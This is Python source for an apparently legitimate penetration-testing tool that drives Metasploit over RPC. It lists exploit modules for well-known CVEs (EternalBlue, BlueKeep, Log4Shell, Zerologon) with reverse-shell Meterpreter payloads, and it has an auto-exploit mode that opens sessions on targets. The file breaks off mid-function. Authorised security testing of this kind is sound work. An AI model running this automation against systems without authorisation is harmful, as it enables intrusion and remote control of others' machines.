"""
Jarwis Network Security - Comprehensive Metasploit Framework Integration

Full-featured Metasploit automation supporting:
- Vulnerability Scanning & Verification
- Exploit Execution (with safety controls)
- Payload Generation
- Session Management
- Post-Exploitation Modules
- Credential Attacks
- Network Service Exploits

Supported Attack Categories:
1. SMB Attacks (EternalBlue, MS08-067, PsExec, etc.)
2. SSH Attacks (Brute Force, Key-based, CVEs)
3. RDP Attacks (BlueKeep, Brute Force)
4. HTTP/Web Attacks (Apache, Tomcat, IIS, etc.)
5. Database Attacks (MySQL, MSSQL, PostgreSQL, Oracle)
6. FTP Attacks (ProFTPD, vsftpd, Wu-FTPd)
7. Mail Server Attacks (SMTP, IMAP, POP3)
8. DNS Attacks (Zone Transfer, Poisoning)
9. LDAP/AD Attacks (Zerologon, Kerberoasting)
10. VPN/Firewall Attacks (Cisco, Fortinet, Palo Alto)

Author: Jarwis AGI Pen Test Framework
License: MIT
"""

import asyncio
import json
import re
import logging
import base64
import tempfile
import os
from dataclasses import dataclass, field, asdict
from enum import Enum
from typing import Dict, List, Optional, Any, Tuple
from datetime import datetime
from pathlib import Path

from .base import (
    BaseScanner, ScanResult, Finding, ScanPhase,
    ScannerRegistry, Severity
)

logger = logging.getLogger(__name__)


class AttackCategory(str, Enum):
    """Categories of network attacks"""
    SMB = "smb"
    SSH = "ssh"
    RDP = "rdp"
    HTTP = "http"
    DATABASE = "database"
    FTP = "ftp"
    MAIL = "mail"
    DNS = "dns"
    LDAP = "ldap"
    VPN = "vpn"
    MISC = "misc"


class ExploitResult(str, Enum):
    """Exploit execution results"""
    VULNERABLE = "vulnerable"
    NOT_VULNERABLE = "not_vulnerable"
    EXPLOITED = "exploited"
    SESSION_CREATED = "session_created"
    ERROR = "error"
    TIMEOUT = "timeout"


@dataclass
class ExploitModule:
    """Metasploit exploit module definition"""
    name: str
    path: str
    category: AttackCategory
    description: str
    cve_ids: List[str] = field(default_factory=list)
    targets: List[str] = field(default_factory=list)  # OS/service targets
    default_payload: str = ""
    required_options: List[str] = field(default_factory=list)
    rank: str = "normal"  # excellent, great, good, normal, average, low, manual
    reliability: str = "normal"  # repeatable, unreliable
    check_supported: bool = True


@dataclass
class PayloadConfig:
    """Payload configuration"""
    name: str
    lhost: str = ""
    lport: int = 4444
    encoder: str = ""
    iterations: int = 0
    bad_chars: str = ""
    format: str = "raw"
    platform: str = ""
    arch: str = ""


# ============= EXPLOIT DATABASE =============

EXPLOIT_DATABASE: Dict[str, List[ExploitModule]] = {
    # SMB/Windows Exploits
    AttackCategory.SMB: [
        ExploitModule(
            name="MS17-010 EternalBlue",
            path="exploit/windows/smb/ms17_010_eternalblue",
            category=AttackCategory.SMB,
            description="EternalBlue SMB Remote Windows Kernel Pool Corruption",
            cve_ids=["CVE-2017-0144", "CVE-2017-0145", "CVE-2017-0146"],
            targets=["Windows 7", "Windows Server 2008 R2", "Windows Server 2012"],
            default_payload="windows/x64/meterpreter/reverse_tcp",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="MS17-010 PsExec",
            path="exploit/windows/smb/ms17_010_psexec",
            category=AttackCategory.SMB,
            description="EternalRomance/EternalSynergy SMB RCE",
            cve_ids=["CVE-2017-0143"],
            targets=["Windows XP", "Windows 7", "Windows Server 2003-2016"],
            default_payload="windows/meterpreter/reverse_tcp",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="MS08-067 NetAPI",
            path="exploit/windows/smb/ms08_067_netapi",
            category=AttackCategory.SMB,
            description="Windows Server Service NetPathCanonicalize Buffer Overflow",
            cve_ids=["CVE-2008-4250"],
            targets=["Windows XP", "Windows Server 2003"],
            default_payload="windows/meterpreter/reverse_tcp",
            required_options=["RHOSTS"],
            rank="great",
        ),
        ExploitModule(
            name="SMB Ghost",
            path="exploit/windows/smb/smbghost_remote",
            category=AttackCategory.SMB,
            description="SMBv3 Compression Buffer Overflow",
            cve_ids=["CVE-2020-0796"],
            targets=["Windows 10 1903", "Windows 10 1909", "Windows Server 1903"],
            default_payload="windows/x64/meterpreter/reverse_tcp",
            required_options=["RHOSTS"],
            rank="great",
        ),
        ExploitModule(
            name="PsExec (Authenticated)",
            path="exploit/windows/smb/psexec",
            category=AttackCategory.SMB,
            description="Remote code execution with valid credentials",
            cve_ids=[],
            targets=["Windows"],
            default_payload="windows/meterpreter/reverse_tcp",
            required_options=["RHOSTS", "SMBUser", "SMBPass"],
            rank="excellent",
        ),
        ExploitModule(
            name="SMB Relay",
            path="exploit/windows/smb/smb_relay",
            category=AttackCategory.SMB,
            description="SMB Relay attack for credential capture",
            cve_ids=[],
            targets=["Windows"],
            required_options=["SMBHOST"],
            rank="good",
        ),
    ],
    
    # SSH Exploits
    AttackCategory.SSH: [
        ExploitModule(
            name="SSH User Code Execution",
            path="exploit/multi/ssh/sshexec",
            category=AttackCategory.SSH,
            description="SSH authenticated remote code execution",
            cve_ids=[],
            targets=["Linux", "Unix", "macOS"],
            default_payload="linux/x64/meterpreter_reverse_tcp",
            required_options=["RHOSTS", "USERNAME", "PASSWORD"],
            rank="excellent",
        ),
        ExploitModule(
            name="libSSH Auth Bypass",
            path="exploit/linux/ssh/libssh_auth_bypass",
            category=AttackCategory.SSH,
            description="libSSH Authentication Bypass",
            cve_ids=["CVE-2018-10933"],
            targets=["libSSH 0.6.0-0.7.5"],
            default_payload="linux/x64/meterpreter_reverse_tcp",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="OpenSSH < 7.2p2 User Enumeration",
            path="auxiliary/scanner/ssh/ssh_enumusers",
            category=AttackCategory.SSH,
            description="OpenSSH username enumeration via timing attack",
            cve_ids=["CVE-2016-6210"],
            targets=["OpenSSH < 7.2p2"],
            required_options=["RHOSTS"],
            rank="good",
            check_supported=False,
        ),
    ],
    
    # RDP Exploits
    AttackCategory.RDP: [
        ExploitModule(
            name="BlueKeep",
            path="exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
            category=AttackCategory.RDP,
            description="RDP Remote Code Execution",
            cve_ids=["CVE-2019-0708"],
            targets=["Windows 7", "Windows Server 2008 R2", "Windows XP"],
            default_payload="windows/x64/meterpreter/reverse_tcp",
            required_options=["RHOSTS"],
            rank="average",  # Can cause BSOD
        ),
        ExploitModule(
            name="RDP NLA Bypass",
            path="auxiliary/scanner/rdp/cve_2019_0708_bluekeep",
            category=AttackCategory.RDP,
            description="BlueKeep RDP vulnerability scanner",
            cve_ids=["CVE-2019-0708"],
            targets=["Windows 7", "Windows Server 2008 R2"],
            required_options=["RHOSTS"],
            rank="good",
            check_supported=True,
        ),
        ExploitModule(
            name="RDP NLA Bypass DoS",
            path="auxiliary/dos/windows/rdp/ms12_020_maxchannelids",
            category=AttackCategory.RDP,
            description="MS12-020 RDP DoS",
            cve_ids=["CVE-2012-0002"],
            targets=["Windows XP-7", "Windows Server 2003-2008"],
            required_options=["RHOSTS"],
            rank="average",
        ),
    ],
    
    # HTTP/Web Exploits
    AttackCategory.HTTP: [
        ExploitModule(
            name="Apache Struts RCE",
            path="exploit/multi/http/struts2_content_type_ognl",
            category=AttackCategory.HTTP,
            description="Apache Struts 2 Jakarta Plugin RCE",
            cve_ids=["CVE-2017-5638"],
            targets=["Apache Struts 2.3.5-2.3.31", "Apache Struts 2.5-2.5.10"],
            default_payload="linux/x64/meterpreter_reverse_tcp",
            required_options=["RHOSTS", "TARGETURI"],
            rank="excellent",
        ),
        ExploitModule(
            name="Apache Tomcat Manager",
            path="exploit/multi/http/tomcat_mgr_deploy",
            category=AttackCategory.HTTP,
            description="Tomcat Manager WAR deployment",
            cve_ids=[],
            targets=["Apache Tomcat"],
            default_payload="java/meterpreter/reverse_tcp",
            required_options=["RHOSTS", "HttpUsername", "HttpPassword"],
            rank="excellent",
        ),
        ExploitModule(
            name="Log4Shell",
            path="exploit/multi/http/log4shell_header_injection",
            category=AttackCategory.HTTP,
            description="Apache Log4j RCE",
            cve_ids=["CVE-2021-44228"],
            targets=["Log4j 2.0-2.14.1"],
            default_payload="java/meterpreter/reverse_tcp",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="PHP CGI Argument Injection",
            path="exploit/multi/http/php_cgi_arg_injection",
            category=AttackCategory.HTTP,
            description="PHP-CGI argument injection RCE",
            cve_ids=["CVE-2012-1823"],
            targets=["PHP < 5.4.2"],
            default_payload="php/meterpreter/reverse_tcp",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="Drupalgeddon2",
            path="exploit/unix/webapp/drupal_drupalgeddon2",
            category=AttackCategory.HTTP,
            description="Drupal Remote Code Execution",
            cve_ids=["CVE-2018-7600"],
            targets=["Drupal 7.x", "Drupal 8.x"],
            default_payload="php/meterpreter/reverse_tcp",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="Jenkins Groovy Script",
            path="exploit/multi/http/jenkins_script_console",
            category=AttackCategory.HTTP,
            description="Jenkins Script Console RCE",
            cve_ids=[],
            targets=["Jenkins"],
            default_payload="java/meterpreter/reverse_tcp",
            required_options=["RHOSTS", "TARGETURI"],
            rank="excellent",
        ),
        ExploitModule(
            name="WebLogic Deserialization",
            path="exploit/multi/misc/weblogic_deserialize",
            category=AttackCategory.HTTP,
            description="Oracle WebLogic Deserialization RCE",
            cve_ids=["CVE-2017-10271"],
            targets=["WebLogic 10.3.6.0", "WebLogic 12.1.3.0"],
            default_payload="java/meterpreter/reverse_tcp",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="Spring4Shell",
            path="exploit/multi/http/spring_framework_rce_spring4shell",
            category=AttackCategory.HTTP,
            description="Spring Framework RCE",
            cve_ids=["CVE-2022-22965"],
            targets=["Spring Framework 5.3.0-5.3.17", "5.2.0-5.2.19"],
            default_payload="linux/x64/meterpreter/reverse_tcp",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
    ],
    
    # Database Exploits
    AttackCategory.DATABASE: [
        ExploitModule(
            name="MSSQL Payload",
            path="exploit/windows/mssql/mssql_payload",
            category=AttackCategory.DATABASE,
            description="Microsoft SQL Server xp_cmdshell",
            cve_ids=[],
            targets=["Microsoft SQL Server"],
            default_payload="windows/meterpreter/reverse_tcp",
            required_options=["RHOSTS", "USERNAME", "PASSWORD"],
            rank="excellent",
        ),
        ExploitModule(
            name="MySQL UDF",
            path="exploit/multi/mysql/mysql_udf_payload",
            category=AttackCategory.DATABASE,
            description="MySQL User Defined Function RCE",
            cve_ids=[],
            targets=["MySQL", "MariaDB"],
            default_payload="linux/x64/meterpreter_reverse_tcp",
            required_options=["RHOSTS", "USERNAME", "PASSWORD"],
            rank="excellent",
        ),
        ExploitModule(
            name="PostgreSQL Copy",
            path="exploit/multi/postgres/postgres_copy_from_program_cmd_exec",
            category=AttackCategory.DATABASE,
            description="PostgreSQL COPY RCE",
            cve_ids=["CVE-2019-9193"],
            targets=["PostgreSQL 9.3-11.2"],
            default_payload="linux/x64/meterpreter_reverse_tcp",
            required_options=["RHOSTS", "USERNAME", "PASSWORD"],
            rank="excellent",
        ),
        ExploitModule(
            name="Oracle TNS Poison",
            path="auxiliary/admin/oracle/tnscmd",
            category=AttackCategory.DATABASE,
            description="Oracle TNS listener commands",
            cve_ids=[],
            targets=["Oracle"],
            required_options=["RHOSTS"],
            rank="normal",
        ),
        ExploitModule(
            name="Redis Replication RCE",
            path="exploit/linux/redis/redis_replication_cmd_exec",
            category=AttackCategory.DATABASE,
            description="Redis replication RCE",
            cve_ids=[],
            targets=["Redis < 5.0.5"],
            default_payload="linux/x64/meterpreter_reverse_tcp",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="MongoDB Injection",
            path="auxiliary/scanner/mongodb/mongodb_login",
            category=AttackCategory.DATABASE,
            description="MongoDB authentication scanner",
            cve_ids=[],
            targets=["MongoDB"],
            required_options=["RHOSTS"],
            rank="normal",
        ),
    ],
    
    # FTP Exploits
    AttackCategory.FTP: [
        ExploitModule(
            name="vsftpd 2.3.4 Backdoor",
            path="exploit/unix/ftp/vsftpd_234_backdoor",
            category=AttackCategory.FTP,
            description="vsftpd 2.3.4 malicious backdoor",
            cve_ids=["CVE-2011-2523"],
            targets=["vsftpd 2.3.4"],
            default_payload="cmd/unix/interact",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="ProFTPD 1.3.3c Backdoor",
            path="exploit/unix/ftp/proftpd_133c_backdoor",
            category=AttackCategory.FTP,
            description="ProFTPD 1.3.3c malicious backdoor",
            cve_ids=["CVE-2010-4221"],
            targets=["ProFTPD 1.3.3c"],
            default_payload="cmd/unix/reverse",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="ProFTPD mod_copy",
            path="exploit/unix/ftp/proftpd_modcopy_exec",
            category=AttackCategory.FTP,
            description="ProFTPD mod_copy file disclosure/RCE",
            cve_ids=["CVE-2015-3306"],
            targets=["ProFTPD < 1.3.5a"],
            default_payload="cmd/unix/reverse_python",
            required_options=["RHOSTS", "SITEPATH"],
            rank="excellent",
        ),
    ],
    
    # Mail Server Exploits
    AttackCategory.MAIL: [
        ExploitModule(
            name="Exim CVE-2019-15846",
            path="exploit/linux/smtp/exim_tls_sni_rce",
            category=AttackCategory.MAIL,
            description="Exim TLS SNI Remote Code Execution",
            cve_ids=["CVE-2019-15846"],
            targets=["Exim < 4.92.2"],
            default_payload="linux/x64/meterpreter_reverse_tcp",
            required_options=["RHOSTS"],
            rank="great",
        ),
        ExploitModule(
            name="Haraka SMTP RCE",
            path="exploit/linux/smtp/haraka",
            category=AttackCategory.MAIL,
            description="Haraka SMTP Command Injection",
            cve_ids=["CVE-2016-1000282"],
            targets=["Haraka < 2.8.9"],
            default_payload="linux/x64/meterpreter_reverse_tcp",
            required_options=["RHOSTS"],
            rank="great",
        ),
        ExploitModule(
            name="Exchange ProxyLogon",
            path="exploit/windows/http/exchange_proxylogon_rce",
            category=AttackCategory.MAIL,
            description="Microsoft Exchange ProxyLogon RCE",
            cve_ids=["CVE-2021-26855", "CVE-2021-27065"],
            targets=["Exchange 2013-2019"],
            default_payload="windows/x64/meterpreter/reverse_tcp",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="Exchange ProxyShell",
            path="exploit/windows/http/exchange_proxyshell_rce",
            category=AttackCategory.MAIL,
            description="Microsoft Exchange ProxyShell RCE",
            cve_ids=["CVE-2021-34473", "CVE-2021-34523", "CVE-2021-31207"],
            targets=["Exchange 2013-2019"],
            default_payload="windows/x64/meterpreter/reverse_tcp",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
    ],
    
    # DNS Exploits
    AttackCategory.DNS: [
        ExploitModule(
            name="DNS Zone Transfer",
            path="auxiliary/gather/dns_info",
            category=AttackCategory.DNS,
            description="DNS enumeration and zone transfer",
            cve_ids=[],
            targets=["DNS Servers"],
            required_options=["DOMAIN"],
            rank="normal",
        ),
        ExploitModule(
            name="BIND TKEY DoS",
            path="auxiliary/dos/dns/bind_tkey",
            category=AttackCategory.DNS,
            description="BIND TKEY query DoS",
            cve_ids=["CVE-2015-5477"],
            targets=["BIND 9.1.0-9.10.2-P2"],
            required_options=["RHOSTS"],
            rank="great",
        ),
    ],
    
    # LDAP/AD Exploits
    AttackCategory.LDAP: [
        ExploitModule(
            name="Zerologon",
            path="exploit/windows/dcerpc/cve_2020_1472_zerologon",
            category=AttackCategory.LDAP,
            description="Netlogon privilege escalation",
            cve_ids=["CVE-2020-1472"],
            targets=["Windows Server 2008-2019"],
            default_payload="windows/x64/meterpreter/reverse_tcp",
            required_options=["RHOSTS", "NBNAME"],
            rank="excellent",
        ),
        ExploitModule(
            name="PrintNightmare",
            path="exploit/windows/dcerpc/cve_2021_1675_printnightmare",
            category=AttackCategory.LDAP,
            description="Windows Print Spooler RCE",
            cve_ids=["CVE-2021-1675", "CVE-2021-34527"],
            targets=["Windows 7-10", "Windows Server 2008-2019"],
            default_payload="windows/x64/meterpreter/reverse_tcp",
            required_options=["RHOSTS", "SMBUser", "SMBPass"],
            rank="excellent",
        ),
        ExploitModule(
            name="PetitPotam",
            path="auxiliary/scanner/dcerpc/petitpotam",
            category=AttackCategory.LDAP,
            description="NTLM relay via EfsRpcOpenFileRaw",
            cve_ids=["CVE-2021-36942"],
            targets=["Windows Server"],
            required_options=["RHOSTS"],
            rank="normal",
        ),
        ExploitModule(
            name="sAMAccountName Spoofing",
            path="auxiliary/admin/kerberos/ms14_068_kerberos_checksum",
            category=AttackCategory.LDAP,
            description="Kerberos checksum validation bypass",
            cve_ids=["CVE-2014-6324"],
            targets=["Windows Server 2003-2012"],
            required_options=["RHOSTS", "USER", "PASSWORD", "DOMAIN"],
            rank="great",
        ),
    ],
    
    # VPN/Firewall Exploits
    AttackCategory.VPN: [
        ExploitModule(
            name="Fortinet SSL VPN Path Traversal",
            path="auxiliary/scanner/http/fortigate_ssl_vpn",
            category=AttackCategory.VPN,
            description="Fortinet SSL VPN credential disclosure",
            cve_ids=["CVE-2018-13379"],
            targets=["FortiOS 5.6.3-6.0.4"],
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="Pulse Secure Path Traversal",
            path="auxiliary/scanner/http/pulse_secure_file_disclosure",
            category=AttackCategory.VPN,
            description="Pulse Secure arbitrary file read",
            cve_ids=["CVE-2019-11510"],
            targets=["Pulse Secure 8.1R15.1-9.0R3.3"],
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="Citrix ADC Path Traversal",
            path="auxiliary/scanner/http/citrix_dir_traversal",
            category=AttackCategory.VPN,
            description="Citrix ADC/Gateway arbitrary code execution",
            cve_ids=["CVE-2019-19781"],
            targets=["Citrix ADC"],
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="Cisco ASA Path Traversal",
            path="auxiliary/scanner/http/cisco_asa_webvpn",
            category=AttackCategory.VPN,
            description="Cisco ASA WebVPN path traversal",
            cve_ids=["CVE-2018-0296"],
            targets=["Cisco ASA"],
            required_options=["RHOSTS"],
            rank="great",
        ),
        ExploitModule(
            name="SonicWall SSL VPN RCE",
            path="exploit/linux/http/sonicwall_ssl_vpn_rce",
            category=AttackCategory.VPN,
            description="SonicWall SSL VPN Shell Injection",
            cve_ids=["CVE-2021-20016"],
            targets=["SonicWall SMA100"],
            default_payload="linux/x64/meterpreter_reverse_tcp",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
    ],
    
    # Miscellaneous Exploits
    AttackCategory.MISC: [
        ExploitModule(
            name="Java RMI Registry",
            path="exploit/multi/misc/java_rmi_server",
            category=AttackCategory.MISC,
            description="Java RMI Server Remote Code Execution",
            cve_ids=[],
            targets=["Java RMI"],
            default_payload="java/meterpreter/reverse_tcp",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="VMware vCenter RCE",
            path="exploit/linux/http/vmware_vcenter_vsan_health_rce",
            category=AttackCategory.MISC,
            description="VMware vCenter VSAN Health RCE",
            cve_ids=["CVE-2021-21972"],
            targets=["VMware vCenter 6.5-7.0"],
            default_payload="linux/x64/meterpreter_reverse_tcp",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="Shellshock",
            path="exploit/multi/http/apache_mod_cgi_bash_env_exec",
            category=AttackCategory.MISC,
            description="Bash environment variable code injection",
            cve_ids=["CVE-2014-6271", "CVE-2014-6278"],
            targets=["Linux/Unix with Bash"],
            default_payload="linux/x64/meterpreter_reverse_tcp",
            required_options=["RHOSTS", "TARGETURI"],
            rank="excellent",
        ),
        ExploitModule(
            name="Jenkins CLI Deserialization",
            path="exploit/multi/http/jenkins_cli_deserialization",
            category=AttackCategory.MISC,
            description="Jenkins CLI RMI Java Deserialization",
            cve_ids=["CVE-2016-0792"],
            targets=["Jenkins < 1.650"],
            default_payload="java/meterpreter/reverse_tcp",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="Docker API RCE",
            path="exploit/linux/http/docker_api_rce",
            category=AttackCategory.MISC,
            description="Docker Remote API Container Escape",
            cve_ids=[],
            targets=["Docker with exposed API"],
            default_payload="linux/x64/meterpreter_reverse_tcp",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
        ExploitModule(
            name="Kubernetes Unauth RCE",
            path="exploit/multi/kubernetes/unauth_rce",
            category=AttackCategory.MISC,
            description="Kubernetes unauthenticated API RCE",
            cve_ids=["CVE-2018-1002105"],
            targets=["Kubernetes < 1.10.11"],
            default_payload="linux/x64/meterpreter_reverse_tcp",
            required_options=["RHOSTS"],
            rank="excellent",
        ),
    ],
}


# ============= AUXILIARY SCANNERS =============

AUXILIARY_SCANNERS: Dict[str, Dict] = {
    "smb_version": {
        "path": "auxiliary/scanner/smb/smb_version",
        "description": "SMB version detection",
        "options": ["RHOSTS"],
    },
    "smb_ms17_010": {
        "path": "auxiliary/scanner/smb/smb_ms17_010",
        "description": "MS17-010 EternalBlue vulnerability scanner",
        "options": ["RHOSTS"],
    },
    "ssh_version": {
        "path": "auxiliary/scanner/ssh/ssh_version",
        "description": "SSH version detection",
        "options": ["RHOSTS"],
    },
    "http_version": {
        "path": "auxiliary/scanner/http/http_version",
        "description": "HTTP server version detection",
        "options": ["RHOSTS"],
    },
    "rdp_scanner": {
        "path": "auxiliary/scanner/rdp/rdp_scanner",
        "description": "RDP version detection",
        "options": ["RHOSTS"],
    },
    "ftp_version": {
        "path": "auxiliary/scanner/ftp/ftp_version",
        "description": "FTP version detection",
        "options": ["RHOSTS"],
    },
    "mysql_version": {
        "path": "auxiliary/scanner/mysql/mysql_version",
        "description": "MySQL version detection",
        "options": ["RHOSTS"],
    },
    "mssql_ping": {
        "path": "auxiliary/scanner/mssql/mssql_ping",
        "description": "MSSQL instance enumeration",
        "options": ["RHOSTS"],
    },
    "postgres_version": {
        "path": "auxiliary/scanner/postgres/postgres_version",
        "description": "PostgreSQL version detection",
        "options": ["RHOSTS"],
    },
    "telnet_version": {
        "path": "auxiliary/scanner/telnet/telnet_version",
        "description": "Telnet banner grabbing",
        "options": ["RHOSTS"],
    },
    "snmp_enum": {
        "path": "auxiliary/scanner/snmp/snmp_enum",
        "description": "SNMP enumeration",
        "options": ["RHOSTS"],
    },
    "ldap_search": {
        "path": "auxiliary/gather/ldap_query",
        "description": "LDAP anonymous enumeration",
        "options": ["RHOSTS"],
    },
}


# ============= PAYLOAD CONFIGURATIONS =============

PAYLOAD_CONFIGS: Dict[str, Dict] = {
    "windows/meterpreter/reverse_tcp": {
        "platforms": ["windows"],
        "arch": "x86",
        "staged": True,
        "handler": "exploit/multi/handler",
    },
    "windows/x64/meterpreter/reverse_tcp": {
        "platforms": ["windows"],
        "arch": "x64",
        "staged": True,
        "handler": "exploit/multi/handler",
    },
    "windows/meterpreter/reverse_https": {
        "platforms": ["windows"],
        "arch": "x86",
        "staged": True,
        "handler": "exploit/multi/handler",
        "options": {"LPORT": 443},
    },
    "linux/x64/meterpreter_reverse_tcp": {
        "platforms": ["linux"],
        "arch": "x64",
        "staged": False,
        "handler": "exploit/multi/handler",
    },
    "linux/x64/shell_reverse_tcp": {
        "platforms": ["linux"],
        "arch": "x64",
        "staged": False,
        "handler": "exploit/multi/handler",
    },
    "java/meterpreter/reverse_tcp": {
        "platforms": ["java"],
        "arch": "java",
        "staged": True,
        "handler": "exploit/multi/handler",
    },
    "php/meterpreter/reverse_tcp": {
        "platforms": ["php"],
        "arch": "php",
        "staged": True,
        "handler": "exploit/multi/handler",
    },
    "cmd/unix/interact": {
        "platforms": ["unix", "linux"],
        "arch": "",
        "staged": False,
        "handler": None,
    },
    "cmd/unix/reverse": {
        "platforms": ["unix", "linux"],
        "arch": "",
        "staged": False,
        "handler": "exploit/multi/handler",
    },
    "cmd/unix/reverse_python": {
        "platforms": ["unix", "linux"],
        "arch": "",
        "staged": False,
        "handler": "exploit/multi/handler",
    },
}


@ScannerRegistry.register
class MetasploitAdvancedScanner(BaseScanner):
    """
    Comprehensive Metasploit Framework Integration
    
    Provides:
    - Automated vulnerability scanning
    - Smart exploit selection based on service fingerprints
    - Payload generation with encoding
    - Session management
    - Safe mode (check-only) and exploitation modes
    - Integration with pymetasploit3 and msfconsole
    """
    
    TOOL_NAME = "metasploit"
    PHASE = ScanPhase.EXPLOITATION
    REQUIRES_ROOT = True
    
    def __init__(self, config: Dict = None):
        super().__init__(config)
        
        # MSF RPC settings
        self.msf_host = config.get('msf_host', '127.0.0.1')
        self.msf_port = config.get('msf_port', 55553)
        self.msf_user = config.get('msf_user', 'msf')
        self.msf_password = config.get('msf_password', 'msf')
        self.msf_ssl = config.get('msf_ssl', True)
        
        # Operation modes
        self.safe_mode = config.get('safe_mode', True)  # Check only, no exploitation
        self.verify_exploits = config.get('verify_exploits', True)
        
        # Listener settings for payloads
        self.lhost = config.get('lhost', '')
        self.lport = config.get('lport', 4444)
        
        # RPC client
        self._client = None
        self._connected = False
    
    async def connect(self) -> bool:
        """Connect to Metasploit RPC server"""
        if self._connected:
            return True
        
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            
            self._client = MsfRpcClient(
                self.msf_password,
                server=self.msf_host,
                port=self.msf_port,
                ssl=self.msf_ssl,
                username=self.msf_user,
            )
            self._connected = True
            logger.info(f"Connected to Metasploit RPC at {self.msf_host}:{self.msf_port}")
            return True
            
        except ImportError:
            logger.warning("pymetasploit3 not installed. Using CLI fallback.")
            return False
        except Exception as e:
            logger.error(f"Failed to connect to MSF RPC: {e}")
            return False
    
    async def run(self, target: str, categories: List[str] = None,
                  exploit_name: str = None, scan_services: bool = True,
                  auto_exploit: bool = False, credentials: Dict = None,
                  **kwargs) -> ScanResult:
        """
        Run Metasploit scanning/exploitation against target.
        
        Args:
            target: Target IP/hostname
            categories: Attack categories to test (smb, ssh, http, etc.)
            exploit_name: Specific exploit module to run
            scan_services: Run service detection first
            auto_exploit: Automatically exploit vulnerabilities (unsafe!)
            credentials: Dict with username, password, domain
        """
        start_time = asyncio.get_event_loop().time()
        
        result = ScanResult(
            tool=self.TOOL_NAME,
            target=target,
            phase=self.PHASE.value,
        )
        
        all_findings = []
        
        # Try RPC connection first
        rpc_available = await self.connect()
        
        if exploit_name:
            # Run specific exploit
            findings = await self._run_specific_exploit(target, exploit_name, credentials, auto_exploit)
            all_findings.extend(findings)
        else:
            # Service-based scanning
            if scan_services:
                services = await self._detect_services(target)
                result.services_discovered = services
                
                # Determine categories from services
                if not categories:
                    categories = self._categories_from_services(services)
            
            # Run vulnerability checks for each category
            categories = categories or [c.value for c in AttackCategory]
            
            for category in categories:
                try:
                    cat_enum = AttackCategory(category) if isinstance(category, str) else category
                    findings = await self._scan_category(target, cat_enum, credentials, auto_exploit)
                    all_findings.extend(findings)
                except Exception as e:
                    logger.error(f"Error scanning category {category}: {e}")
                    result.error = str(e)
        
        # Collect sessions if exploitation was performed
        if auto_exploit and rpc_available:
            sessions = await self._get_sessions(target)
            if sessions:
                all_findings.append(Finding(
                    id=self._generate_id(),
                    tool=self.TOOL_NAME,
                    category="session",
                    severity=Severity.CRITICAL.value,
                    title=f"Active Meterpreter Session(s): {len(sessions)}",
                    description="Successfully exploited target and obtained shell access",
                    target=target,
                    confidence=1.0,
                    metadata={'sessions': sessions},
                ))
        
        result.findings = all_findings
        result.scan_time = asyncio.get_event_loop().time() - start_time
        
        return result
    
    async def _detect_services(self, target: str) -> List[Dict]:
        """Detect services using Metasploit auxiliary scanners"""
        services = []
        
        # Key service scanners
        scanners = [
            ('smb_version', 445),
            ('ssh_version', 22),
            ('http_version', 80),
            ('rdp_scanner', 3389),
            ('ftp_version', 21),
            ('mysql_version', 3306),
            ('mssql_ping', 1433),
        ]
        
        for scanner_name, default_port in scanners:
            try:
                scanner_info = AUXILIARY_SCANNERS.get(scanner_name)
                if not scanner_info:
                    continue
                
                output = await self._run_auxiliary(
                    scanner_info['path'],
                    {'RHOSTS': target}
                )
                
                if output and 'detected' in output.lower():
                    services.append({
                        'port': default_port,
                        'service': scanner_name.replace('_version', '').replace('_scanner', ''),
                        'version': self._extract_version(output),
                        'raw': output,
                    })
                    
            except Exception as e:
                logger.debug(f"Service scan {scanner_name} failed: {e}")
        
        return services
    
    def _categories_from_services(self, services: List[Dict]) -> List[str]:
        """Determine attack categories from detected services"""
        categories = []
        
        service_map = {
            'smb': AttackCategory.SMB,
            'ssh': AttackCategory.SSH,
            'rdp': AttackCategory.RDP,
            'http': AttackCategory.HTTP,
            'https': AttackCategory.HTTP,
            'ftp': AttackCategory.FTP,
            'mysql': AttackCategory.DATABASE,
            'mssql': AttackCategory.DATABASE,
            'postgres': AttackCategory.DATABASE,
            'oracle': AttackCategory.DATABASE,
            'smtp': AttackCategory.MAIL,
            'ldap': AttackCategory.LDAP,
        }
        
        for svc in services:
            svc_name = svc.get('service', '').lower()
            for key, cat in service_map.items():
                if key in svc_name:
                    if cat.value not in categories:
                        categories.append(cat.value)
        
        return categories
    
    async def _scan_category(self, target: str, category: AttackCategory,
                             credentials: Dict = None, auto_exploit: bool = False) -> List[Finding]:
        """Scan target for vulnerabilities in a specific category"""
        findings = []
        
        exploits = EXPLOIT_DATABASE.get(category, [])
        
        for exploit in exploits:
            try:
                # Check if exploit is applicable
                if exploit.check_supported:
                    is_vulnerable, details = await self._check_vulnerability(target, exploit, credentials)
                    
                    if is_vulnerable:
                        finding = Finding(
                            id=self._generate_id(),
                            tool=self.TOOL_NAME,
                            category=category.value,
                            severity=self._rank_to_severity(exploit.rank),
                            title=f"{exploit.name} Vulnerability Detected",
                            description=exploit.description,
                            target=target,
                            cve_id=exploit.cve_ids[0] if exploit.cve_ids else '',
